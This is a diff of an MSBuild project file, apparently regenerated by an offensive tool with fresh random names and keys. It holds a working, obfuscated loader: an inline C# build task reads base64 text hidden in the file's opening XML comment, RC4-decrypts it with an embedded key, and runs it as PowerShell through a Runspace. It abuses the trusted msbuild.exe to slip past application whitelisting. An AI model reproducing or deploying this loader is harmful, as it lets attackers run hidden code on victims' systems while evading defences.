@@ -1,13 +1,13 @@
 <!--
-CAFbaNAj0KhQubox
+I3OzTp+2V/8hqCkD
 -->
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <Target Name="izdFhv">
-   <izdFhv />
-   <fcpYdVLlBEyuXyyHyYqtZa />
+  <Target Name="ilCIMZS">
+   <ilCIMZS />
+   <DYwsDFPcRhQZdBXVcyof />
    </Target>
   <UsingTask
-    TaskName="izdFhv"
+    TaskName="ilCIMZS"
     TaskFactory="CodeTaskFactory"
     AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <ParameterGroup/>
@@ -19,7 +19,7 @@ CAFbaNAj0KhQubox
     </Task>
 	</UsingTask>
 	<UsingTask
-    TaskName="fcpYdVLlBEyuXyyHyYqtZa"
+    TaskName="DYwsDFPcRhQZdBXVcyof"
     TaskFactory="CodeTaskFactory"
     AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
 	<Task>
@@ -36,80 +36,80 @@ CAFbaNAj0KhQubox
 		using Microsoft.Build.Framework;
 		using System.Management.Automation.Runspaces;
 		
-		public class fcpYdVLlBEyuXyyHyYqtZa :  Task, ITask {	
+		public class DYwsDFPcRhQZdBXVcyof :  Task, ITask {	
 			public override bool Execute() {
-				string[] HbHUleGGCZpI = Environment.GetCommandLineArgs();
+				string[] McFBlBcSBs = Environment.GetCommandLineArgs();
 			
-				Runspace jdNVsxz = RunspaceFactory.CreateRunspace();
-				jdNVsxz.Open();
-				RunspaceInvoke NWaWOJZTqPvgaWsEKTmfKCx = new RunspaceInvoke(jdNVsxz);
-				Pipeline PRBjdkOUcn = jdNVsxz.CreatePipeline();
+				Runspace oIhyCJKSRUMfrrNSYdTRKZ = RunspaceFactory.CreateRunspace();
+				oIhyCJKSRUMfrrNSYdTRKZ.Open();
+				RunspaceInvoke rufpYCoXxxHoERmp = new RunspaceInvoke(oIhyCJKSRUMfrrNSYdTRKZ);
+				Pipeline mWnkhhWfJUjyQsWLndPeEk = oIhyCJKSRUMfrrNSYdTRKZ.CreatePipeline();
 				
-				StreamReader ounbchGKCstD = File.OpenText(HbHUleGGCZpI[1]);
-				StringBuilder LTRaKWsxdsfAKMsXpmL = new StringBuilder();
-				string bfMPmOoMUQlclLeWUeFUa;
-				while((bfMPmOoMUQlclLeWUeFUa = ounbchGKCstD.ReadLine()) != null) {
-						if(String.Equals(bfMPmOoMUQlclLeWUeFUa, "-->")) {
-							byte[] IwmqT = {0x33, 0x99, 0x05, 0x74, 0x7e, 0x57, 0x3f, 0x91, 0xfb, 0x9b, 0x8b, 0x5e, 0xde, 0x80, 0x29, 0xe2, 0x16, 0xf3, 0xdb, 0xcb, 0xb3, 0xe3, 0x21, 0xf4, 0xcf, 0xe6, 0xa7, 0x21, 0x31, 0xef, 0xd7, 0xec};
-							byte[] RQonQ = Convert.FromBase64String(LTRaKWsxdsfAKMsXpmL.ToString());
-							string HEuIjEAQUxnKhFU = Encoding.UTF8.GetString(RHKYSzgcpLZYXMotNg.hnYPLleVlHeljlvxDhejzJN(IwmqT, RQonQ));
+				StreamReader vocrFykeAL = File.OpenText(McFBlBcSBs[1]);
+				StringBuilder CISHuTMJBaUksYsuTdekAAO = new StringBuilder();
+				string QAagGxUEaBYhbyr;
+				while((QAagGxUEaBYhbyr = vocrFykeAL.ReadLine()) != null) {
+						if(String.Equals(QAagGxUEaBYhbyr, "-->")) {
+							byte[] EhWwuOVWFHjoPP = {0xa6, 0x6a, 0x43, 0xc0, 0x62, 0xed, 0x8c, 0x4c, 0x93, 0x07, 0x37, 0xee, 0x88, 0x68, 0xe7, 0xe9, 0x1d, 0x9c, 0x0c, 0xf6, 0x3d, 0x8d, 0x43, 0x4d, 0x70, 0xf0, 0xad, 0x4e, 0x33, 0xaa, 0x94, 0x2a};
+							byte[] xZTRI = Convert.FromBase64String(CISHuTMJBaUksYsuTdekAAO.ToString());
+							string CJJlgGyCwTukkkpUFQNhU = Encoding.UTF8.GetString(SlBNFldqHdSMVSoRRntQCC.WTBVNZvBgmjHJTKhTDMU(EhWwuOVWFHjoPP, xZTRI));
 						
-							PRBjdkOUcn.Commands.AddScript(HEuIjEAQUxnKhFU);
-							PRBjdkOUcn.Commands.Add("Out-String");
-							Collection<PSObject> wNEhAXw = PRBjdkOUcn.Invoke();
-							jdNVsxz.Close();
+							mWnkhhWfJUjyQsWLndPeEk.Commands.AddScript(CJJlgGyCwTukkkpUFQNhU);
+							mWnkhhWfJUjyQsWLndPeEk.Commands.Add("Out-String");
+							Collection<PSObject> RvVocvBBbVzBUMWWAYxidYGT = mWnkhhWfJUjyQsWLndPeEk.Invoke();
+							oIhyCJKSRUMfrrNSYdTRKZ.Close();
 							
-							StringBuilder dafimCcnFbmGFGFJGX = new StringBuilder();
-							foreach(PSObject WzOZQAjqBtcFadoKExvbecaw in wNEhAXw) {
-								dafimCcnFbmGFGFJGX.AppendLine(WzOZQAjqBtcFadoKExvbecaw.ToString());
+							StringBuilder RBuVrHAhZXLmLWdE = new StringBuilder();
+							foreach(PSObject imYCrpYaGIxuNOb in RvVocvBBbVzBUMWWAYxidYGT) {
+								RBuVrHAhZXLmLWdE.AppendLine(imYCrpYaGIxuNOb.ToString());
 							}
-							Console.Write(dafimCcnFbmGFGFJGX.ToString());
+							Console.Write(RBuVrHAhZXLmLWdE.ToString());
 							return true;
 						}
-						if(!String.Equals(bfMPmOoMUQlclLeWUeFUa, "<!--")) {
-							LTRaKWsxdsfAKMsXpmL.AppendLine(bfMPmOoMUQlclLeWUeFUa);
+						if(!String.Equals(QAagGxUEaBYhbyr, "<!--")) {
+							CISHuTMJBaUksYsuTdekAAO.AppendLine(QAagGxUEaBYhbyr);
 						}
 				}
 				return true;
 			}
 		}
 		
-		public class RHKYSzgcpLZYXMotNg {
-			public static byte[] VDZdtqAEv(byte[] QbUEIfajqOcBQD, byte[] AaWBcTDFxLejBCTQ) {
-				int BLNrWhhOEIKxSAU, CeaNvMD, erRoLVcxGwdnfIcHoOPPPE, YdYSjnehmGrvxbgofI, wfXivxvXInznu;
-				int[] cwXLTruasSKacXpAjb, ketOesuGzJEq;
-				byte[] OAtzYJDwPTwjTDocTtzKATws;
+		public class SlBNFldqHdSMVSoRRntQCC {
+			public static byte[] ZPCjmmtFWmE(byte[] FieJSNlbonSaYshQs, byte[] EljvPr) {
+				int tEcHAi, WkTXWIcpniwPynHPN, LoztYnmtNCCoVKebvjnxMgRA, GRcSpFpmvvevLhWlRJhFQuky, oIYJGhHxuYMr;
+				int[] tJWXjwekJyuPwmf, aWzUxNBlsQtZurByNB;
+				byte[] BQuIvwAKkSMKUlOwF;
 
-				cwXLTruasSKacXpAjb = new int[256];
-				ketOesuGzJEq = new int[256];
-				OAtzYJDwPTwjTDocTtzKATws = new byte[AaWBcTDFxLejBCTQ.Length];
+				tJWXjwekJyuPwmf = new int[256];
+				aWzUxNBlsQtZurByNB = new int[256];
+				BQuIvwAKkSMKUlOwF = new byte[EljvPr.Length];
 
-				for (CeaNvMD = 0; CeaNvMD < 256; CeaNvMD++) {
-					cwXLTruasSKacXpAjb[CeaNvMD] = QbUEIfajqOcBQD[CeaNvMD % QbUEIfajqOcBQD.Length];
-					ketOesuGzJEq[CeaNvMD] = CeaNvMD;
+				for (WkTXWIcpniwPynHPN = 0; WkTXWIcpniwPynHPN < 256; WkTXWIcpniwPynHPN++) {
+					tJWXjwekJyuPwmf[WkTXWIcpniwPynHPN] = FieJSNlbonSaYshQs[WkTXWIcpniwPynHPN % FieJSNlbonSaYshQs.Length];
+					aWzUxNBlsQtZurByNB[WkTXWIcpniwPynHPN] = WkTXWIcpniwPynHPN;
 				}
-				for (erRoLVcxGwdnfIcHoOPPPE = CeaNvMD = 0; CeaNvMD < 256; CeaNvMD++) {
-					erRoLVcxGwdnfIcHoOPPPE = (erRoLVcxGwdnfIcHoOPPPE + ketOesuGzJEq[CeaNvMD] + cwXLTruasSKacXpAjb[CeaNvMD]) % 256;
-					wfXivxvXInznu = ketOesuGzJEq[CeaNvMD];
-					ketOesuGzJEq[CeaNvMD] = ketOesuGzJEq[erRoLVcxGwdnfIcHoOPPPE];
-					ketOesuGzJEq[erRoLVcxGwdnfIcHoOPPPE] = wfXivxvXInznu;
+				for (LoztYnmtNCCoVKebvjnxMgRA = WkTXWIcpniwPynHPN = 0; WkTXWIcpniwPynHPN < 256; WkTXWIcpniwPynHPN++) {
+					LoztYnmtNCCoVKebvjnxMgRA = (LoztYnmtNCCoVKebvjnxMgRA + aWzUxNBlsQtZurByNB[WkTXWIcpniwPynHPN] + tJWXjwekJyuPwmf[WkTXWIcpniwPynHPN]) % 256;
+					oIYJGhHxuYMr = aWzUxNBlsQtZurByNB[WkTXWIcpniwPynHPN];
+					aWzUxNBlsQtZurByNB[WkTXWIcpniwPynHPN] = aWzUxNBlsQtZurByNB[LoztYnmtNCCoVKebvjnxMgRA];
+					aWzUxNBlsQtZurByNB[LoztYnmtNCCoVKebvjnxMgRA] = oIYJGhHxuYMr;
 				}
-				for (BLNrWhhOEIKxSAU = erRoLVcxGwdnfIcHoOPPPE = CeaNvMD = 0; CeaNvMD < AaWBcTDFxLejBCTQ.Length; CeaNvMD++) {
-					BLNrWhhOEIKxSAU++;
-					BLNrWhhOEIKxSAU %= 256;
-					erRoLVcxGwdnfIcHoOPPPE += ketOesuGzJEq[BLNrWhhOEIKxSAU];
-					erRoLVcxGwdnfIcHoOPPPE %= 256;
-					wfXivxvXInznu = ketOesuGzJEq[BLNrWhhOEIKxSAU];
-					ketOesuGzJEq[BLNrWhhOEIKxSAU] = ketOesuGzJEq[erRoLVcxGwdnfIcHoOPPPE];
-					ketOesuGzJEq[erRoLVcxGwdnfIcHoOPPPE] = wfXivxvXInznu;
-					YdYSjnehmGrvxbgofI = ketOesuGzJEq[((ketOesuGzJEq[BLNrWhhOEIKxSAU] + ketOesuGzJEq[erRoLVcxGwdnfIcHoOPPPE]) % 256)];
-					OAtzYJDwPTwjTDocTtzKATws[CeaNvMD] = (byte)(AaWBcTDFxLejBCTQ[CeaNvMD] ^ YdYSjnehmGrvxbgofI);
+				for (tEcHAi = LoztYnmtNCCoVKebvjnxMgRA = WkTXWIcpniwPynHPN = 0; WkTXWIcpniwPynHPN < EljvPr.Length; WkTXWIcpniwPynHPN++) {
+					tEcHAi++;
+					tEcHAi %= 256;
+					LoztYnmtNCCoVKebvjnxMgRA += aWzUxNBlsQtZurByNB[tEcHAi];
+					LoztYnmtNCCoVKebvjnxMgRA %= 256;
+					oIYJGhHxuYMr = aWzUxNBlsQtZurByNB[tEcHAi];
+					aWzUxNBlsQtZurByNB[tEcHAi] = aWzUxNBlsQtZurByNB[LoztYnmtNCCoVKebvjnxMgRA];
+					aWzUxNBlsQtZurByNB[LoztYnmtNCCoVKebvjnxMgRA] = oIYJGhHxuYMr;
+					GRcSpFpmvvevLhWlRJhFQuky = aWzUxNBlsQtZurByNB[((aWzUxNBlsQtZurByNB[tEcHAi] + aWzUxNBlsQtZurByNB[LoztYnmtNCCoVKebvjnxMgRA]) % 256)];
+					BQuIvwAKkSMKUlOwF[WkTXWIcpniwPynHPN] = (byte)(EljvPr[WkTXWIcpniwPynHPN] ^ GRcSpFpmvvevLhWlRJhFQuky);
 				}
-				return OAtzYJDwPTwjTDocTtzKATws;
+				return BQuIvwAKkSMKUlOwF;
 			}
 
-			public static byte[] hnYPLleVlHeljlvxDhejzJN(byte[] JlbcbMsRDU, byte[] bALjHFggPHADH) {
-				return VDZdtqAEv(JlbcbMsRDU, bALjHFggPHADH);
+			public static byte[] WTBVNZvBgmjHJTKhTDMU(byte[] iJiuodWIOvkeZcywA, byte[] LUiACf) {
+				return ZPCjmmtFWmE(iJiuodWIOvkeZcywA, LUiACf);
 			}
 		}
         ]]>
